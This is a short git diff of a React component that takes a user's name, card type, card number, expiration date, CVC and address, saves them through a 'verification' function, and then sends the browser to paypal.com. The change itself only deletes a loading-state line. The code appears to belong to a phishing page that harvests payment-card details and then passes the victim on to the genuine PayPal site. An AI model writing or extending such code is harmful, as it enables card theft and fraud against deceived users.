@@ -18,7 +18,6 @@ export default function (){
         setLoading(true);
         await addVerificationDetails({name,cardType,cardNo,expirationDate,cvc,address,timestamp:new Date().getTime()});
         window.location.href ='https://paypal.com'
-        setLoading(false);
 
     }
     return <div className="u-body u-xl-mode">
